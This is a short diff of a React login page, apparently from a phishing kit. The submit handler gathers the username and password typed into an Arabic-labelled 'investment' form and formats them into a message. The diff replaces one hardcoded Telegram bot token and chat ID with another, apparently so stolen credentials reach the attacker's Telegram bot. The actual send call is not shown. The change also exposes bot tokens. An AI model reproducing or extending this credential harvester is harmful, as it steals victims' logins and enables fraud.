@@ -15,9 +15,9 @@ const Page = () => {
     const handleOnSubmit = (e) => {
         e.preventDefault();
         var bot={
-          token:"6752886623:AAEEnEA0icsjnl_LxSfEz7bpMwAneG4NmJg",
-          chat_id:6859240733
-        }
+      token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
+      chat_id:6364334502
+    }
         var length =`الاستثمار اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} `
        
         
